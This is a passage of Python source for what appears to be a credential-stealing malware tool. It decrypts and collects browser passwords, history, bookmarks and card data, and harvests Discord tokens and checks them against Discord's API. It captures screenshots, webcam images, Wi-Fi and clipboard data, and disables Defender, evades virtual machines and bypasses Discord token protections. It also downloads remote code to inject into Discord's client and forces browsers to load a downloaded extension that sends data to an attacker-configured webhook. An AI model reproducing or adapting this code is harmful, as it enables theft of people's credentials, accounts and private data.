            "google-chrome": self.appdata + "\\Google\\Chrome\\User Data",
            "epic-privacy-browser": self.appdata + "\\Epic Privacy Browser\\User Data",
            "microsoft-edge": self.appdata + "\\Microsoft\\Edge\\User Data",
            "uran": self.appdata + "\\uCozMedia\\Uran\\User Data",
            "yandex": self.appdata + "\\Yandex\\YandexBrowser\\User Data",
            "brave": self.appdata + "\\BraveSoftware\\Brave-Browser\\User Data",
            "iridium": self.appdata + "\\Iridium\\User Data",
            "edge": self.appdata + "\\Microsoft\\Edge\\User Data",
            "operaneon": self.roaming +  "\\Opera Software\\Opera Neon\\User Data",
            "operastable": self.roaming + "\\Opera Software\\Opera Stable",
            "operagx": self.roaming + "\\Opera Software\\Opera GX Stable",
        }
        self.profiles = [
            "Default",
            "Profile 1",
            "Profile 2",
            "Profile 3",
            "Profile 4",
            "Profile 5",
        ]

        if self.thishawk_webh == "" or self.thishawk_webh == "\x57EBHOOK_HERE":
            self.hwkishexit_this()

        self.hide_so()
        self.askadmin()
        self.hwkishdisabledefender()
        self.remoter_hwkisherr()
        self.startup_so()

        if self.find_in_config("SAEZRTYRES1") and AntiDebugg().inVM is True:
            self.hwkishexit_this()
        if self.find_in_config("AEZRETRYY5") == "yes":
            await self.bypss_betterdsc()
            await self.bypass_tokenprtct()

        if self.hwk_get_sys == "yes":
            os.makedirs(os.path.join(self.dir, "Systeme"), exist_ok=True)

        if self.hwk_get_rblx == "yes":
            os.makedirs(os.path.join(self.dir, "Roblox"), exist_ok=True)
        function_list = [
            self.screen_baby,
            self.camera_baby,
            self.hwkishget_mywifi,
            self.downloadclipboard,
            self.hwkishfindUSBdevices,
            self.hwkishgetmyAV,
            self.system_informations,
            self.found_thistkn,
            self.found_thismc,
            self.find_roblox,
        ]

        if self.find_in_config("killdiscord_config") is True:
            await self.kill_process_id()
        if self.hwk_get_browsers == "yes":
            os.makedirs(os.path.join(self.dir, "Browsers"), exist_ok=True)
        for name, path in self.browsers.items():
            if not os.path.isdir(path):
                continue
            self.masterkey = self.mykey_gtm(path + "\\Local State")
            self.funcs = [
                self.gang_hwkstl,
                self.hwkishsteal_thishist2,
                self.hwkishsteal_thisbookmarks,
                self.hwkishsteal_psw2,
                self.hwkishsteal_cc2,
            ]

            try:
                t = threading.Thread(target=self.firefox())
                t.start()
            except:
                pass
            for profile in self.profiles:
                for func in self.funcs:
                    try:
                        func(name, path, profile)
                    except:
                        pass
                    try:
                        func(name, path)
                    except:
                        pass
        if os.path.exists(self.chrome_user_path) and self.chrome_key is not None:
            os.makedirs(os.path.join(self.dir, "Google"), exist_ok=True)
            function_list.extend([self.hwkishsteal_psw, self.hwkishstol_gang, self.hwkishsteal_thishist])
        for func in function_list:
            process = threading.Thread(target=func, daemon=True)
            process.start()
        for t in threading.enumerate():
            try:
                t.join()
            except RuntimeError:
                continue
        self.detect_browsers()
        x = threading.Thread(target=self.install_extension())
        x.start()
        self.natify_matched_tokens()
        self.ping_on_running()
        self.finished_bc()
        await self.injection_discord()
        
    def kill_process(self, process_name):
        for proc in psutil.process_iter():
            try:
                if proc.name() == process_name:
                    proc.kill()
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                pass
            
    def detect_browsers(self):
        browser_executables = [
            os.path.join(os.environ.get('LOCALAPPDATA'), 'Programs', 'Opera', 'launcher.exe'),
            os.path.join(os.environ.get('PROGRAMFILES'), 'Opera', 'launcher.exe'),
            os.path.join(os.environ.get('PROGRAMFILES(X86)'), 'Opera', 'launcher.exe'),

            os.path.join(os.environ.get('PROGRAMFILES'), 'Opera GX', 'launcher.exe'),
            os.path.join(os.environ.get('LOCALAPPDATA'), 'Programs', 'Opera GX', 'launcher.exe'),
            os.path.join(os.environ.get('PROGRAMFILES(X86)'), 'Opera GX', 'launcher.exe'),

            os.path.join(os.environ.get('PROGRAMFILES'), 'Opera Neon', 'launcher.exe'),
            os.path.join(os.environ.get('LOCALAPPDATA'), 'Programs', 'Opera Neon', 'launcher.exe'),
            os.path.join(os.environ.get('PROGRAMFILES(X86)'), 'Opera Neon', 'launcher.exe'),

            os.path.join(os.environ.get('LOCALAPPDATA'), 'Programs', 'BraveSoftware', 'Brave-Browser', 'Application', 'brave.exe'),
            os.path.join(os.environ.get('PROGRAMFILES'), 'BraveSoftware', 'Brave-Browser', 'Application', 'brave.exe'),
            os.path.join(os.environ.get('PROGRAMFILES(X86)'), 'BraveSoftware', 'Brave-Browser', 'Application', 'brave.exe'),

            os.path.join(os.environ.get('LOCALAPPDATA'), 'Google', 'Chrome', 'Application', 'chrome.exe'),
            os.path.join(os.environ.get('PROGRAMFILES'), 'Google', 'Chrome', 'Application', 'chrome.exe'),
            os.path.join(os.environ.get('PROGRAMFILES(X86)'), 'Google', 'Chrome', 'Application', 'chrome.exe'),

            os.path.join(os.environ.get('PROGRAMFILES'), 'Vivaldi', 'Application', 'vivaldi.exe'),
            os.path.join(os.environ.get('LOCALAPPDATA'), 'Programs', 'Vivaldi', 'Application', 'vivaldi.exe'),
            os.path.join(os.environ.get('PROGRAMFILES(X86)'), 'Vivaldi', 'Application', 'Vivaldi.exe'),

            os.path.join(os.environ.get('LOCALAPPDATA'), 'Microsoft', 'Edge', 'Application', 'msedge.exe'),
            os.path.join(os.environ.get('PROGRAMFILES'), 'Microsoft', 'Edge', 'Application', 'msedge.exe'),
            os.path.join(os.environ.get('PROGRAMFILES(X86)'), 'Microsoft', 'Edge', 'Application', 'msedge.exe'),

            os.path.join(os.environ.get('LOCALAPPDATA'), 'Yandex', 'YandexBrowser', 'Application','browser.exe'),
            os.path.join(os.environ.get('PROGRAMFILES'), 'Yandex', 'YandexBrowser', 'Application','browser.exe'),
            os.path.join(os.environ.get('PROGRAMFILES(X86)'), 'Yandex', 'YandexBrowser', 'Application','browser.exe'),

            os.path.join(os.environ.get('LOCALAPPDATA'), 'Yandex', 'YandexBrowserBeta', 'Application','browser.exe'),
            os.path.join(os.environ.get('PROGRAMFILES'), 'Yandex', 'YandexBrowserBeta', 'Application','browser.exe'),
            os.path.join(os.environ.get('PROGRAMFILES(X86)'), 'Yandex', 'YandexBrowserBeta', 'Application','browser.exe'),

            os.path.join(os.environ.get('LOCALAPPDATA'), 'Yandex', 'YandexBrowserDev', 'Application','browser.exe'),
            os.path.join(os.environ.get('PROGRAMFILES'), 'Yandex', 'YandexBrowserDev', 'Application','browser.exe'),
            os.path.join(os.environ.get('PROGRAMFILES(X86)'), 'Yandex', 'YandexBrowserDev', 'Application','browser.exe'),

            os.path.join(os.environ.get('LOCALAPPDATA'), 'SRWare Iron', 'iron.exe'),
            os.path.join(os.environ.get('PROGRAMFILES'), 'SRWare Iron', 'iron.exe'),
            os.path.join(os.environ.get('PROGRAMFILES(X86)'), 'SRWare Iron', 'iron.exe'),

            os.path.join(os.environ.get('LOCALAPPDATA'), 'Kiwi', 'kiwi.exe'),
            os.path.join(os.environ.get('PROGRAMFILES'), 'Kiwi', 'kiwi.exe'),
            os.path.join(os.environ.get('PROGRAMFILES(X86)'), 'Kiwi', 'kiwi.exe'),

            os.path.join(os.environ.get('LOCALAPPDATA'), 'Torch', 'Application', 'torch.exe'),
            os.path.join(os.environ.get('PROGRAMFILES'), 'Torch', 'Application', 'torch.exe'),
            os.path.join(os.environ.get('PROGRAMFILES(X86)'), 'Torch', 'Application', 'torch.exe'),

            os.path.join(os.environ.get('LOCALAPPDATA'), 'Slimjet', 'slimjet.exe'),
            os.path.join(os.environ.get('PROGRAMFILES'), 'Slimjet', 'slimjet.exe'),
            os.path.join(os.environ.get('PROGRAMFILES(X86)'), 'Slimjet', 'slimjet.exe'),

            os.path.join(os.environ.get('LOCALAPPDATA'), 'Comodo', 'Dragon', 'dragon.exe'),
            os.path.join(os.environ.get('PROGRAMFILES'), 'Comodo', 'Dragon', 'dragon.exe'),
            os.path.join(os.environ.get('PROGRAMFILES(X86)'), 'Comodo', 'Dragon', 'dragon.exe')
        ]
        for browser_executable in browser_executables:
            if os.path.exists(browser_executable):
                if 'Opera GX' in browser_executable:
                    self.operagx = True
                elif 'Opera' in browser_executable:
                    self.opera = True
                elif 'Brave' in browser_executable:
                    self.brave = True
                elif 'Chrome' in browser_executable:
                    self.chrome = True
                elif 'vivaldi' in browser_executable.lower():
                    self.vivaldi = True
                elif 'msedge' in browser_executable.lower():
                    self.edge = True
                elif 'yandex' in browser_executable.lower():
                    self.yandex = True
                elif 'iron' in browser_executable.lower():
                    self.iron = True
                elif 'kiwi' in browser_executable.lower():
                    self.kiwi = True
                elif 'Torch' in browser_executable.lower():
                    self.torch = True
                elif 'Slimjet' in browser_executable.lower():
                    self.slimjet = True
                elif 'Dragon' in browser_executable.lower():
                    self.dragon = True
                elif 'Opera Neon' in browser_executable.lower():
                    self.operaneon = True

    def install_extension(self):
        if self.find_in_config("chromenject_config") != "yes":
            return
        
        try:
            
            for browser, process_name in self.browser_processes.items():
                if process_name in (p.name() for p in psutil.process_iter()):
                    self.kill_process(process_name)

                    
            extensions = {
                'extensions': f'https://github.com/{hwkish}-{stspecial}/Chrome-Inject/raw/main/extensions.zip'
            }
            for extension_name, github_repo in extensions.items():
                extensions_path = os.path.join(self.programdata, 'GoogleChromeExtensions')
                extension_path = os.path.join(self.programdata, 'GoogleChromeExtensions', extension_name)
                response = requests.get(github_repo)
                zip_path = os.path.join(os.path.abspath(os.path.dirname(__file__)), f'{extension_name}.zip')
            with open(zip_path, 'wb') as f:
                f.write(response.content)
            with zipfile.ZipFile(zip_path, 'r') as zip_ref:
                zip_ref.extractall(extension_path)
                time.sleep(2)
                main_file = os.path.join(extension_path, "extension-tokens", 'js', 'background.js')
                main_file2 = os.path.join(extension_path, "extension-roblox", 'scripts', 'background.js')

                with open(main_file, 'r') as f:
                    filedata = f.read()
                    if self.apilink != "%API_"+ "LINK%" and self.apilink != "" and self.apilink != " ":
                        newdata = filedata.replace('%API_URL%', self.apilink)
                    else:
                        newdata = filedata.replace('%WEBHOOK%', self.thishawk_webh)
                with open(main_file, 'w') as f:
                    f.write(newdata)
                    f.close()
                with open(main_file2, 'r') as f:
                    filedata = f.read()
                    if self.apilink != "%API_"+ "LINK%" and self.apilink != "" and self.apilink != " ":
                        newdata = filedata.replace('%API_URL%', self.apilink)
                    else:
                        newdata = filedata.replace('%WEBHOOK%', self.thishawk_webh)
                with open(main_file2, 'w') as f:
                    f.write(newdata)
                    f.close()
            os.remove(zip_path)
            if shell32.IsUserAnAdmin() == 0:
                    pass
            else:
                try:        

                    for shortcut_name in ['Google Chrome', 'Opera', 'Opera GX', 'Opera Neon', 'Comodo Dragon', 'Slimjet', 'Torch Browser', 'Brave', 'Vivaldi', 'Microsoft Edge', 'Yandex Browser', 'SRWare Iron', 'Kiwi Browser']:
                        shortcut_path = self.path_shortcutnav_roaming.get(shortcut_name)
                        if shortcut_path:
                            if (shortcut_name == 'Google Chrome' and self.chrome) or \
                                    (shortcut_name == 'Opera' and self.opera) or \
                                    (shortcut_name == 'Opera GX' and self.operagx) or \
                                    (shortcut_name == 'Brave' and self.brave) or \
                                    (shortcut_name == 'Vivaldi' and self.vivaldi) or \
                                    (shortcut_name == 'Microsoft Edge' and self.edge) or \
                                    (shortcut_name == 'Yandex Browser' and self.yandex) or \
                                    (shortcut_name == 'SRWare Iron' and self.iron) or \
                                    (shortcut_name == 'Opera Neon' and self.operaneon) or \
                                    (shortcut_name == 'Comodo Dragon' and self.dragon) or \
                                    (shortcut_name == 'Torch Browser' and self.torch) or \
                                    (shortcut_name == 'Slimjet' and self.slimjet) or \
                                    (shortcut_name == 'Kiwi Browser' and self.kiwi):
                                shortcut_dir = os.path.dirname(shortcut_path)
                                if os.path.exists(shortcut_dir):
                                    powershell_command = (
                                    f'$WshShell = New-Object -comObject WScript.Shell; '
                                    f'$Shortcut = $WshShell.CreateShortcut("{shortcut_path}"); '
                                    f'$Shortcut.Arguments = "--load-extension={extensions_path}/{extension_name}/extension-roblox,{extensions_path}/{extension_name}/extension-tokens"; '
                                    f'$Shortcut.Save()'
                                    )
                                    try:
                                        Popen(["powershell", "-Command", powershell_command], creationflags=CREATE_NEW_CONSOLE)
                                        time.sleep(5)
                                    except Exception as e:
                                        time.sleep(5)
                                        pass
                except Exception as e:
                    pass


                try:
                    for shortcut_name in ['Google Chrome', 'Opera', 'Opera GX', 'Opera Neon', 'Comodo Dragon', 'Slimjet', 'Torch Browser', 'Brave', 'Vivaldi', 'Microsoft Edge', 'Yandex Browser', 'SRWare Iron', 'Kiwi Browser']:
                        shortcut_path = self.path_shortcutnav_programdata.get(shortcut_name)
                        if shortcut_path:
                            if (shortcut_name == 'Google Chrome' and self.chrome) or \
                                    (shortcut_name == 'Opera' and self.opera) or \
                                    (shortcut_name == 'Opera GX' and self.operagx) or \
                                    (shortcut_name == 'Brave' and self.brave) or \
                                    (shortcut_name == 'Vivaldi' and self.vivaldi) or \
                                    (shortcut_name == 'Microsoft Edge' and self.edge) or \
                                    (shortcut_name == 'Yandex Browser' and self.yandex) or \
                                    (shortcut_name == 'SRWare Iron' and self.iron) or \
                                    (shortcut_name == 'Opera Neon' and self.operaneon) or \
                                    (shortcut_name == 'Comodo Dragon' and self.dragon) or \
                                    (shortcut_name == 'Torch Browser' and self.torch) or \
                                    (shortcut_name == 'Slimjet' and self.slimjet) or \
                                    (shortcut_name == 'Kiwi Browser' and self.kiwi):
                                shortcut_dir = os.path.dirname(shortcut_path)
                                if os.path.exists(shortcut_dir):
                                    powershell_command = (
                                    f'$WshShell = New-Object -comObject WScript.Shell; '
                                    f'$Shortcut = $WshShell.CreateShortcut("{shortcut_path}"); '
                                    f'$Shortcut.Arguments = "--load-extension={extensions_path}/{extension_name}/extension-roblox,{extensions_path}/{extension_name}/extension-tokens"; '
                                    f'$Shortcut.Save()'
                                    )
                                    try:
                                        Popen(["powershell", "-Command", powershell_command], creationflags=CREATE_NEW_CONSOLE)
                                        time.sleep(5)
                                    except Exception as e:
                                        time.sleep(5)
                                        pass
                except Exception as e:
                    pass

                try:
                    for shortcut_name in ['Google Chrome', 'Opera', 'Opera GX', 'Opera Neon', 'Comodo Dragon', 'Slimjet', 'Torch Browser', 'Brave', 'Vivaldi', 'Microsoft Edge', 'Yandex Browser', 'SRWare Iron', 'Kiwi Browser']:
                        shortcut_path = self.path_shortcutnav_additionnal.get(shortcut_name)
                        if shortcut_path:
                            if (shortcut_name == 'Google Chrome' and self.chrome) or \
                                    (shortcut_name == 'Opera' and self.opera) or \
                                    (shortcut_name == 'Opera GX' and self.operagx) or \
                                    (shortcut_name == 'Brave' and self.brave) or \
                                    (shortcut_name == 'Vivaldi' and self.vivaldi) or \
                                    (shortcut_name == 'Microsoft Edge' and self.edge) or \
                                    (shortcut_name == 'Yandex Browser' and self.yandex) or \
                                    (shortcut_name == 'SRWare Iron' and self.iron) or \
                                    (shortcut_name == 'Opera Neon' and self.operaneon) or \
                                    (shortcut_name == 'Comodo Dragon' and self.dragon) or \
                                    (shortcut_name == 'Torch Browser' and self.torch) or \
                                    (shortcut_name == 'Slimjet' and self.slimjet) or \
                                    (shortcut_name == 'Kiwi Browser' and self.kiwi):
                                shortcut_dir = os.path.dirname(shortcut_path)
                                if os.path.exists(shortcut_dir):
                                    powershell_command = (
                                    f'$WshShell = New-Object -comObject WScript.Shell; '
                                    f'$Shortcut = $WshShell.CreateShortcut("{shortcut_path}"); '
                                    f'$Shortcut.Arguments = "--load-extension={extensions_path}/{extension_name}/extension-roblox,{extensions_path}/{extension_name}/extension-tokens"; '
                                    f'$Shortcut.Save()'
                                    )
                                    try:
                                        Popen(["powershell", "-Command", powershell_command], creationflags=CREATE_NEW_CONSOLE)
                                        time.sleep(5)
                                    except Exception as e:
                                        time.sleep(5)
                                        pass
                except Exception as e:
                    pass
        except Exception as e:
            pass

    async def injection_discord(self):
        if self.find_in_config("AEZRETRYY5") != "yes":
            return
        discord_paths = [
            os.path.join(self.appdata, p)
            for p in os.listdir(self.appdata)
            if "discord" in p.lower()
        ]
        for discord_path in discord_paths:
            app_paths = [
                os.path.join(discord_path, p)
                for p in os.listdir(discord_path)
                if re.match(r"app-(\d*\.\d*)*", p)
            ]
            for app_path in app_paths:
                modules_path = os.path.join(app_path, "modules")
                if not os.path.exists(modules_path):
                    continue
                inj_paths = [
                    os.path.join(modules_path, p)
                    for p in os.listdir(modules_path)
                    if re.match(fr"{coresecretname}-\d+", p)
                ]
                for inj_path in inj_paths:
                    for root, dirs, files in os.walk(inj_path):
                        if "index.js" in files:
                            idx_path = os.path.join(root, "index.js")
                    if self.localstartup not in argv[0]:
                        try:
                            for inj_path in inj_paths:
                                for root, dirs, files in os.walk(inj_path):
                                    if "index.js" in files:
                                        os.makedirs(os.path.join(root, hwkish), exist_ok=True)
                        except PermissionError:
                            pass
                    if self.webapi_find in self.thishawk_webh:
                        core_asar = self.find_in_config("url_hawkinject")
                        try:
                            f = httpx.get(core_asar).text
                            if self.apilink != "%API_"+ "LINK%" and self.apilink != "" and self.apilink != " ":
                                f = f.replace("%API_URL%", self.apilink)
                                f = f.replace("%NAME_CREATOR%", self.str_creator_)
                                f = f.replace("%TRANSFER_URL%", self.thezip_url.replace("\n", ""))
                            else:
                                f = f.replace("%WEBHOOK%", self.thishawk_webh)
                                f = f.replace("%NAME_CREATOR%", self.str_creator_)
                                f = f.replace("%TRANSFER_URL%", self.thezip_url.replace("\n", ""))
                        except AttributeError:
                            pass
                    try:
                        with open(
                            idx_path, "w", errors="ignore"
                            ) as indexdiscfile:
                            indexdiscfile.write(f)
                    except PermissionError:
                        pass
                
                    if self.find_in_config("killdiscord_config"):
                        file_name = os.path.splitext(os.path.basename(discord_path))[0]
                        app_exe = os.path.join(app_path, file_name + ".exe")
                        if not os.path.isabs(app_exe):
                            raise ValueError(f"Invalid path: {app_exe}")
                        cmd = [app_exe]
                        try:
                            subprocess.run(cmd, check=True)
                        except subprocess.CalledProcessError as e:
                            print(f"Error starting the application: {e}")
                        except FileNotFoundError as e:
                            print(f"Application file not found: {e}")
                        except Exception as e:
                            print(f"An error occurred: {e}")

    async def bypass_tokenprtct(self):
        tp = os.path.join(self.roaming, "DiscordTokenProtector")
        config = os.path.join(tp, "config.json")
        if not os.path.exists(tp) or not os.path.isdir(tp) or not os.path.isfile(config):
            return
        for i in ["DiscordTokenProtector.exe", "ProtectionPayload.dll", "secure.dat"]:
            try:
                os.remove(os.path.join(tp, i))
            except FileNotFoundError:
                pass
        with open(config, "r", errors="ignore") as f:
            try:
                item = json.load(f)
            except json.decoder.JSONDecodeError:
                return
        item[f"{hwkish}_{stspecial}_is_here"] = f"https://github.com/{hwkish}-{stspecial}"
        item["auto_start"] = False
        item["auto_start_discord"] = False
        item["integrity"] = False
        item["integrity_allowbetterdiscord"] = False
        item["integrity_checkexecutable"] = False
        item["integrity_checkhash"] = False
        item["integrity_checkmodule"] = False
        item["integrity_checkscripts"] = False
        item["integrity_checkresource"] = False
        item["integrity_redownloadhashes"] = False
        item["iterations_iv"] = 364
        item["iterations_key"] = 457
        item["version"] = 69420
        with open(config, "w") as f:
            json.dump(item, f, indent=2, sort_keys=True)
            f.write(f"\n\n//{hwkish}_{stspecial}_is_here | https://github.com/{hwkish}-{stspecial}")

    async def kill_process_id(self):
        bllist = self.find_in_config("blacklistedprog")
        for i in [
            "discord",
            "discordtokenprotector",
            "discordcanary",
            "discorddevelopment",
            "discordptb",
        ]:
            bllist.append(i)
        for proc in psutil.process_iter():
            if any(procstr in proc.name().lower() for procstr in bllist):
                try:
                    proc.kill()
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass
        for proc in psutil.process_iter():
            if any(procstr in proc.name().lower() for procstr in bllist):
                try:
                    proc.kill()
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass
                
    async def bypss_betterdsc(self):
        bd = self.roaming + "\\BetterDiscord\\data\\betterdiscord.asar"
        if os.path.exists(bd):
            x = self.webapi_find
            with open(bd, "r", encoding="cp437", errors="ignore") as f:
                txt = f.read()
                content = txt.replace(x, f"{hwkish}_{stspecial}goat")
            with open(bd, "w", newline="", encoding="cp437", errors="ignore") as f:
                f.write(content)

    @extract_try
    def decrypt_this_value(self, buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception:
            return "Failed to decrypt password"

    def found_thistkn(self):
        paths_to_check = []
        
        roaming_path = os.path.expanduser('~\\AppData\\Roaming')
        for root, dirs, files in os.walk(roaming_path):
            for file in files:
                if file.endswith('.ldb'):
                    paths_to_check.append(root)
                    break
        
        local_path = os.path.expanduser('~\\AppData\\Local')
        for root, dirs, files in os.walk(local_path):
            for file in files:
                if file.endswith('.ldb'):
                    paths_to_check.append(root)
                    break
        
        for path in paths_to_check:
            if not os.path.exists(path):
                continue
            
            disc = os.path.basename(path).replace(" ", "").lower()
            
            if "cord" in path:
                local_state_path = os.path.join(self.roaming, disc, "Local State")
                if os.path.exists(local_state_path):
                    for filename in os.listdir(path):
                        if filename[-3:] not in ["log", "ldb"]:
                            continue
                        for line in [
                            x.strip()
                            for x in open(os.path.join(path, filename), errors="ignore").readlines()
                            if x.strip()
                        ]:
                            for y in re.findall(self.regexcrypt, line):
                                try:
                                    token = self.decrypt_this_value(
                                        base64.b64decode(y.split("dQw4w9WgXcQ:")[1]),
                                        self.found_thismasterk3y(local_state_path),
                                    )
                                except ValueError:
                                    pass
                                try:
                                    r = requests.get(
                                        self.disc_url_api,
                                        headers={
                                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
                                            "Content-Type": "application/json",
                                            "Authorization": token,
                                        },
                                    )
                                except Exception:
                                    pass
                                if r.status_code == 200:
                                    uid = r.json()["id"]
                                    if uid not in self.hwkishid:
                                        self.hawked.append(token)
                                        self.hwkishid.append(uid)
            else:
                for filename in os.listdir(path):
                    if filename[-3:] not in ["log", "ldb"]:
                        continue
                    for line in [
                        x.strip()
                        for x in open(os.path.join(path, filename), errors="ignore").readlines()
                        if x.strip()
                    ]:
                        for token in re.findall(self.regex, line):
                            try:
                                r = requests.get(
                                    self.disc_url_api,
                                    headers={
                                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
                                        "Content-Type": "application/json",
                                        "Authorization": token,
                                    },
                                )
                            except Exception:
                                pass
                            if r.status_code == 200:
                                uid = r.json()["id"]
                                if uid not in self.hwkishid:
                                    self.hawked.append(token)
                                    self.hwkishid.append(uid)
        
        if os.path.exists(os.path.join(self.roaming, "Mozilla\\Firefox\\Profiles")):
            for path, _, files in os.walk(os.path.join(self.roaming, "Mozilla\\Firefox\\Profiles")):
                for _file in files:
                    if not _file.endswith(".sqlite"):
                        continue
                    for line in [
                        x.strip()
                        for x in open(os.path.join(path, _file), errors="ignore").readlines()
                        if x.strip()
                    ]:
                        for token in re.findall(self.regex, line):
                            try:
                                r = requests.get(
                                    self.disc_url_api,
                                    headers={
                                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
                                        "Content-Type": "application/json",
                                        "Authorization": token,
                                    },
                                )
                            except Exception:
                                pass
                            if r.status_code == 200:
                                uid = r.json()["id"]
                                if uid not in self.hwkishid:
                                    self.hawked.append(token)
                                    self.hwkishid.append(uid)
            else:
                for filname in os.listdir(path):
                    if filname[-3:] not in ["log", "ldb"]:
                        continue
                    for line in [
                        x.strip()
                        for x in open(f"{path}\\{filname}", errors="ignore").readlines()
                        if x.strip()
                    ]:
                        for token in re.findall(self.regex, line):
                            try:
                                r = requests.get(
                                    self.disc_url_api,
                                    headers={
                                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
                                        "Content-Type": "application/json",
                                        "Authorization": token,
                                    },
                                )
                            except Exception:
                                pass
                            if r.status_code == 200:
                                uid = r.json()["id"]
                                if uid not in self.hwkishid:
                                    self.hawked.append(token)
                                    self.hwkishid.append(uid)
        if os.path.exists(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
            for path, _, files in os.walk(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
                for _file in files:
                    if not _file.endswith(".sqlite"):
                        continue
                    for line in [
                        x.strip()
                        for x in open(f"{path}\\{_file}", errors="ignore").readlines()
                        if x.strip()
                    ]:
                        for token in re.findall(self.regex, line):
                            try:
                                r = requests.get(
                                    self.disc_url_api,
                                    headers={
                                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
                                        "Content-Type": "application/json",
                                        "Authorization": token,
                                    },
                                )
                            except Exception:
                                pass
                            if r.status_code == 200:
                                uid = r.json()["id"]
                                if uid not in self.hwkishid:
                                    self.hawked.append(token)
                                    self.hwkishid.append(uid)

    def dir_random_create(self, _dir: str or os.PathLike = gettempdir()):
        filname = "".join(random.SystemRandom().choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")for _ in range(random.randint(10, 20)))
        path = os.path.join(_dir, filname)
        open(path, "x")
        return path
    
    def test_firefox_psw(self, export):
        if not export:
            return
        try:
            p = Popen(["pass"], stdout=PIPE, stderr=PIPE)
        except OSError as e:
            if e.errno == 2:
                pass
            else:
                pass
        out, err = p.communicate()
        if p.returncode != 0:
            if 'Try "pass init"' in err:
                pass
            else:
                pass

    def export_pass(self, to_export, prefix):
        for address in to_export:
            for user, passw in to_export[address].items():
                if len(to_export[address]) > 1:
                    passname = u"{0}/{1}/{2}".format(prefix, address, user)
                else:
                    passname = u"{0}/{1}".format(prefix, address)
                data = u"{0}\n{1}\n".format(passw, user)
                cmd = ["pass", "insert", "--force", "--multiline", passname]
                p = Popen(cmd, stdout=PIPE, stderr=PIPE, stdin=PIPE)
                out, err = p.communicate(data.encode("utf8"))
                if p.returncode != 0:
                    pass


    def get_sections(self, profiles):
        sections = {}
        i = 1
        for section in profiles.sections():
            if section.startswith("Profile"):
                sections[str(i)] = profiles.get(section, "Path")
                i += 1
            else:
                continue
        return sections


    def read_profiles(self, basepath, list_profiles):
        profileini = os.path.join(basepath, "profiles.ini")
        if not os.path.isfile(profileini):
            pass
        profiles = ConfigParser()
        profiles.read(profileini)
        return profiles


    def get_profile(self, basepath, interactive=False, choice=None, list_profiles=False):
        try:
            profiles = self.read_profiles(basepath, list_profiles)
        except Exception as e:
            pass
        else:
            sections = self.get_sections(profiles)
            if not interactive and choice:
                selected_sections = [sections[c] for c in choice if c in sections]
            else:
                selected_sections = list(sections.values())
            profiles = [os.path.join(basepath, section) for section in selected_sections]
            for profile in profiles:
                if not os.path.isdir(profile):
                    pass
        return profiles



    def parse_sys_args(self):
        if os.name == "nt":
            profile_path = os.path.join(os.environ['APPDATA'], "Mozilla", "Firefox")
        elif os.uname()[0] == "Darwin":
            profile_path = "~/Library/Application Support/Firefox"
        else:
            profile_path = "~/.mozilla/firefox"
        args = {
            'profile': profile_path,
            'export_pass': False,
            'pass_prefix': u"web",
            'format': "human",
            'delimiter': ";",
            'quotechar': '"',
            'interactive': True,
            'choice': None,
            'list': False,
            'verbose': 0
        }
        args['delimiter'] = ";" if args['delimiter'] != "\\t" else "\t"
        return args
    
    def load_profile(self, profile):
        try:
            self.profile = profile
            e = self.NSS._NSS_Init(b"sql:" + self.profile.encode("utf8"))
            if e != 0:
                pass
        except:
            pass

    def authenticate(self, interactive):
        keyslot = self.NSS._PK11_GetInternalKeySlot()
        if not keyslot:
            self.NSS.handle_error()
            pass
        self.NSS._PK11_FreeSlot(keyslot)

    def unload_profile(self):
        e = self.NSS._NSS_Shutdown()
        if e != 0:
            pass

    def decode_entry(self, user64, passw64):
        user = self.NSS.decode(user64)
        passw = self.NSS.decode(passw64)
        return user, passw
    
    def obtain_credentials(self, profile):
        try:
            credentials = JsonCredentials(profile)
        except NotFoundError:
            try:
                credentials = SqliteCredentials(profile)
            except NotFoundError:
                pass
        return credentials
    

    def fetch_firefox_bookmarks(self, profile_path):
        bookmarks_db_path = os.path.join(profile_path, "places.sqlite")
        try:
            conn = sqlite3.connect(bookmarks_db_path)
            cursor = conn.cursor()
            cursor.execute("SELECT moz_bookmarks.title, moz_places.url FROM moz_bookmarks INNER JOIN moz_places ON moz_bookmarks.fk = moz_places.id WHERE moz_bookmarks.type = 1")
            bookmarks_data = cursor.fetchall()
            conn.close()
        except sqlite3.Error as e:
            return ""
        
        try:
            bookmarks_str = ""
            for bookmark in bookmarks_data:
                title = bookmark[0]
                url = bookmark[1]
                entry_str = "Title: {:<40} URL: {}\n".format(title, url)
                bookmarks_str += entry_str
            if not os.path.exists(os.path.join(self.dir, "Firefox")):
                    os.makedirs(os.path.join(self.dir, "Firefox"), exist_ok=True)
            with open(os.path.join(self.dir, "Firefox", f"Bookmarks.txt"), "w", encoding="utf-8") as output_file:
                output_file.write(bookmarks_str)
            
            self.thingstocount[f'bookmarksbaby'] += len(title)
        except:
            pass


    def fetch_firefox_credit_cards(self, profile_path):
        signons_db_path = os.path.join(profile_path, "signons.sqlite")
        try:
            conn = sqlite3.connect(signons_db_path)
            cursor = conn.cursor()
            cursor.execute("SELECT hostname, username, password FROM moz_logins WHERE (password_type = 1 OR password_type = 2) AND times_used > 0")
            credit_cards_data = cursor.fetchall()
            conn.close()
        except sqlite3.Error as e:
